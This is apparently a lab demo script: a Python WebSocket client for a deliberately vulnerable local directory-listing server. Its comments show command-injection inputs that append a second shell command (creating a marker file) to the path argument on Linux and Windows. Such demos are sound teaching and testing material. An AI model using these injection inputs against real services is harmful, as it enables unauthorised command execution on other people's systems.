# ws_client.py
# python vuln_ws_server.py          # 终端1：启动服务
# python ws_client.py "."           # 终端2：正常列目录
# python ws_client.py ".; touch injected_ws.txt"   # Linux 触发注入（创建文件）
# python ws_client.py ". & echo INJECTED> injected_ws.txt" # Windows触发注入（创建文件）

import asyncio, sys, websockets

async def go(msg: str):
    async with websockets.connect("ws://127.0.0.1:8765") as ws:
        print(await ws.recv())
        await ws.send(msg)
        print(await ws.recv())

if __name__ == "__main__":
    msg = sys.argv[1] if len(sys.argv) > 1 else "."
    asyncio.run(go(msg))
